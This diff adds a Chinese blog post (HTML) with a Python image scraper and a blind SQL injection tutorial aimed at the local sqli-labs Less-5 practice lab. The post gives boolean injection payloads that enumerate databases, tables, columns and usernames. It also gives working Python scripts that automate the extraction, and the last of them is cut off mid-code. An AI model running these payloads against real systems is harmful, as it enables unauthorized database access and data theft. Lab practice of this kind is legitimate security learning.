@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh—CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yichennet.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false,"b2t":true,"scrollpercent":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="基于requests库的爬虫采用re+requests+os+threading+time爬取burst下面的高质量图片">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于requests库的爬虫和注入工具">
+<meta property="og:url" content="https://yichennet.github.io/2020/07/17/%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Erequests%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%92%8C%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="逸晨のBlog">
+<meta property="og:description" content="基于requests库的爬虫采用re+requests+os+threading+time爬取burst下面的高质量图片">
+<meta property="og:locale" content="zh—CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ggp363yowaj31h70n7b29.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp3y2exwmj30qm0igwgk.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp41gtunjj311b096mxy.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp42wj4agj31b60kzqpx.jpg">
+<meta property="article:published_time" content="2020-07-17T06:32:20.605Z">
+<meta property="article:modified_time" content="2020-07-17T06:28:40.021Z">
+<meta property="article:author" content="逸晨">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="信息安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ggp363yowaj31h70n7b29.jpg">
+
+<link rel="canonical" href="https://yichennet.github.io/2020/07/17/%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Erequests%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%92%8C%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh—CN'
+  };
+</script>
+
+  <title>基于requests库的爬虫和注入工具 | 逸晨のBlog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">逸晨のBlog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录生活中的点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh—CN">
+    <link itemprop="mainEntityOfPage" href="https://yichennet.github.io/2020/07/17/%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Erequests%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%92%8C%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tx.jpeg">
+      <meta itemprop="name" content="逸晨">
+      <meta itemprop="description" content="直到这一刻微笑着说话为止，我至少留下了一公升眼泪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逸晨のBlog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          基于requests库的爬虫和注入工具
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-07-17 14:32:20 / 修改时间：14:28:40" itemprop="dateCreated datePublished" datetime="2020-07-17T14:32:20+08:00">2020-07-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/07/17/%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Erequests%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%92%8C%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/17/%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Erequests%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%92%8C%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="基于requests库的爬虫"><a href="#基于requests库的爬虫" class="headerlink" title="基于requests库的爬虫"></a>基于requests库的爬虫</h2><p>采用re+requests+os+threading+time爬取burst下面的高质量图片</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ggp363yowaj31h70n7b29.jpg" alt="图片"></p>
+<a id="more"></a>
+
+<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BurstSpider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.url_temp=<span class="string">"https://burst.shopify.com/landscape?page=&#123;&#125;"</span></span><br><span class="line">        self.pic_temp=<span class="string">"https://burst.shopifycdn.com"</span></span><br><span class="line">        self.headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''获取网页的url地址'''</span></span><br><span class="line">        <span class="keyword">return</span> [self.url_temp.format(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_img_list</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        <span class="string">'''获取图片地址'''</span></span><br><span class="line">        img_url_list=[]</span><br><span class="line">        response=requests.get(url,headers=self.headers)</span><br><span class="line">        resulf=response.content.decode()</span><br><span class="line">        img_list = re.findall(<span class="string">r"/photos/[\w-]*\?c=landscape"</span>, str(resulf))</span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> img_list:</span><br><span class="line">            img_url_list.append(self.pic_temp+re.sub(<span class="string">r"\?c=landscape"</span>, <span class="string">""</span>, img)+<span class="string">".jpg"</span>)</span><br><span class="line">        <span class="keyword">return</span> img_url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_pic</span><span class="params">(self,page,img_list)</span>:</span></span><br><span class="line">        <span class="string">"""保存图片"""</span></span><br><span class="line">        <span class="comment">#1.新建文件夹</span></span><br><span class="line">        dirs=<span class="string">"BURSH_&#123;&#125;"</span>.format(page)</span><br><span class="line">        os.mkdir(dirs)</span><br><span class="line">        <span class="comment">#图片名字</span></span><br><span class="line">        <span class="comment">#遍历图片列表并保存</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(img_list)):</span><br><span class="line">            t=threading.Thread(target=self.down_pic,args=((i,page,dirs)))</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="comment">#减少对对方服务器的伤害</span></span><br><span class="line">        time.sleep(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">down_pic</span><span class="params">(self,i,page,dirs)</span>:</span></span><br><span class="line">        img_down = requests.get(self.img_list[i])</span><br><span class="line">        print(<span class="string">"正在下载第%d页第%d张图片"</span> % (page, i+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">with</span> open(dirs + <span class="string">"/"</span> + str(i+<span class="number">1</span>) + <span class="string">".jpg"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(img_down.content)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 1.获取url地址</span></span><br><span class="line">        url_list=self.get_url_list()</span><br><span class="line">        <span class="comment"># 2.遍历</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            <span class="comment"># 3.获取url列表中的图片地址</span></span><br><span class="line">            self.img_list=self.get_img_list(url)</span><br><span class="line">            <span class="comment"># 4.保存(导入页码数，图片列表)</span></span><br><span class="line">            self.save_pic(int(url[<span class="number">-1</span>]),self.img_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    burstSpider=BurstSpider()</span><br><span class="line">    burstSpider.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="爬取效果截图："><a href="#爬取效果截图：" class="headerlink" title="爬取效果截图："></a>爬取效果截图：</h3><p>因为是多线程，所以爬取顺序不一样</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp3y2exwmj30qm0igwgk.jpg" alt="test"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp41gtunjj311b096mxy.jpg" alt="test"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggp42wj4agj31b60kzqpx.jpg" alt="test"></p>
+<h2 id="基于requests库的盲注脚本"><a href="#基于requests库的盲注脚本" class="headerlink" title="基于requests库的盲注脚本"></a>基于requests库的盲注脚本</h2><ul>
+<li><h3 id="二分式"><a href="#二分式" class="headerlink" title="二分式"></a>二分式</h3><ul>
+<li><h4 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h4><blockquote>
+<ol>
+<li><a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100 %23 通过二分法猜解得到所有的库,红色为可变参数。</li>
+<li><a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1%23  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</li>
+<li><a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 %23通过二分法可猜解users内的字段，其中红色为可变参数。</li>
+<li><a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a>  and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1 %23继续猜解即可得到字段内的值。</li>
+</ol>
+</blockquote>
+</li>
+<li><h4 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    max = <span class="number">122</span></span><br><span class="line">    <span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (max + min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__ = mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content.decode():</span><br><span class="line">            min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max = mid</span><br><span class="line"></span><br><span class="line">    database += chr(max)</span><br><span class="line">    print(database)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><h3 id="利用多线程加速"><a href="#利用多线程加速" class="headerlink" title="利用多线程加速"></a>利用多线程加速</h3><ul>
+<li><h4 id="注入思路-1"><a href="#注入思路-1" class="headerlink" title="注入思路"></a>注入思路</h4><blockquote>
+<p>通过查询所有（库，表，字段）名的长度,利用多线程进行迅速猜解</p>
+<p>代码较为繁琐，还是二分式来的香，还容易出bug</p>
+</blockquote>
+</li>
+<li><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sqli_Z_P</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,sqli_url)</span>:</span></span><br><span class="line">        <span class="comment">#需要查询的网页</span></span><br><span class="line">        self.sqli_url=sqli_url</span><br><span class="line">        <span class="comment">#查询可能存在匹配可能性的值</span></span><br><span class="line">        self.match1=<span class="string">'_,0123456789abcdefghijklmnopqrstuvwxy@-!ABCDEFGHIJKLMNOPQRSTUVWXY'</span></span><br><span class="line">        <span class="comment">#匹配数字</span></span><br><span class="line">        self.match2=<span class="string">"0123456789"</span></span><br><span class="line">        <span class="comment">#存储数据库的内判断出来的内容</span></span><br><span class="line">        self.content=<span class="string">""</span></span><br><span class="line">        <span class="comment">#查询所有库名的长度</span></span><br><span class="line">        self.len_sch=sqli_url+<span class="string">" and ascii(substr(length((select group_concat(schema_name) from information_schema.schemata)),&#123;&#125;,1))="</span></span><br><span class="line">        <span class="comment">#查询所查表的表名长度</span></span><br><span class="line">        self.len_tab = sqli_url + <span class="string">" and ascii(substr(length((select group_concat(table_name) from information_schema.tables where table_schema=\'&#123;sch_name&#125;\')),&#123;leng&#125;,1))="</span></span><br><span class="line">        <span class="comment">#查询所查字段的字段名长度</span></span><br><span class="line">        self.len_col = sqli_url + <span class="string">" and ascii(substr(length((select group_concat(column_name) from information_schema.columns where table_name=\'&#123;table_name&#125;\')),&#123;leng&#125;,1))="</span></span><br><span class="line">        <span class="comment">#查询数据中的数据长度</span></span><br><span class="line">        self.len_da=sqli_url+<span class="string">" and ascii(substr(length((select group_concat(concat_ws(0x5f"</span></span><br><span class="line">        <span class="comment">#查询所有库的语句</span></span><br><span class="line">        self.schemata=sqli_url+<span class="string">" and ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;num&#125;,1))=&#123;match&#125; %23"</span></span><br><span class="line">        <span class="comment">#查询所查库的所有表的语句</span></span><br><span class="line">        self.se_tables=sqli_url+<span class="string">" and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'&#123;sch_name&#125;\'),&#123;num&#125;,1))=&#123;match&#125; %23"</span></span><br><span class="line">        <span class="comment">#查询所查表的所有字段的语句</span></span><br><span class="line">        self.se_columns=sqli_url+<span class="string">" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'&#123;table_name&#125;\'),&#123;num&#125;,1))=&#123;match&#125; %23"</span></span><br><span class="line">        <span class="comment">#查询字段中所有数据的语句</span></span><br><span class="line">        self.se_datas=sqli_url+<span class="string">" and ascii(substr((select group_concat(concat_ws(0x5f"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge_all</span><span class="params">(self,url,j)</span>:</span></span><br><span class="line">        response=requests.get(url)</span><br><span class="line">        resulf=response.content.decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> resulf:</span><br><span class="line">            self.content+=j</span><br><span class="line">            print(self.content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,i,id,len_x,value=<span class="string">""</span>)</span>:</span></span><br><span class="line">        <span class="string">"""尝试做一个试用于本代码的所有多进程"""</span></span><br><span class="line">        <span 